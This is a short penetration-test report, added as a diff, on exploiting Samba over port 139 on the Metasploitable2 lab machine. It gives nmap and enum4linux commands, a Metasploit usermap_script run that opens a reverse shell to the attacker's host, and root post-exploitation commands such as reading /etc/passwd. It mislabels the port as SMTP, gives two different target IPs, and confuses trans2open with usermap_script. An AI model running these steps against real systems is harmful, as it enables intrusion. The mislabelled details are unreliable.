@@ -1,0 +1,79 @@
+Penetration Testing Report – Metasploitable2 (Port 139 - SMB)
+
+Target: Metasploitable 2
+IP Address: 192.168.1.101
+Port: 139 (SMTP)
+Date: 15-06-2025
+Tested By: [ ME ]
+
+3. Reconnaissance
+
+3.1 Nmap Scan
+Command:
+nmap -sS -p 139 -sV -O 192.168.56.101
+
+Results:
+PORT    STATE SERVICE  VERSION
+139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+
+4. Enumeration
+
+4.1 Enum4linux
+Command:
+enum4linux -a 192.168.56.101
+
+Key Findings:
+- Samba version: 3.0.20
+- Shares detected: IPC$, ADMIN$, tmp
+- Possible guest access to shares
+- User accounts discovered
+
+5. Exploitation
+
+5.1 Exploit Used: Samba trans2open (CVE-2007-2447)
+Metasploit Module: exploit/multi/samba/usermap_script
+
+Steps:
+1. Launch Metasploit:
+   msfconsole
+
+2. Search and select the exploit:
+   use exploit/multi/samba/usermap_script
+
+3. Configure the exploit:
+   set RHOST 192.168.56.101
+   set RPORT 139
+   set PAYLOAD cmd/unix/reverse
+   set LHOST 192.168.56.1  # Attacker's IP
+   run
+
+Result:
+- A reverse shell was successfully obtained.
+- Confirmed code execution as root.
+
+6. Post-Exploitation
+
+6.1 System Enumeration
+Commands run:
+whoami
+uname -a
+ifconfig
+cat /etc/passwd
+
+Findings:
+- User: root
+- Full control over the system
+- Able to extract sensitive system files
+
+6.2 Persistence Possibility
+- Reverse shell persistence via cron jobs or backdoor shells can be established.
+- Samba misconfiguration allows repeatable exploitation.
+
+7. Remediation Recommendations
+- Upgrade Samba to the latest secure version.
+- Monitor logs for unusual activity on ports 139 and 445.
+
+8. Conclusion
+Port 139 on Metasploitable2 was successfully exploited using a known Samba vulnerability.
+The attack enabled root-level access, proving the critical risk posed by outdated and misconfigured SMB services. 
+This highlights the need for proactive patch management and service hardening.
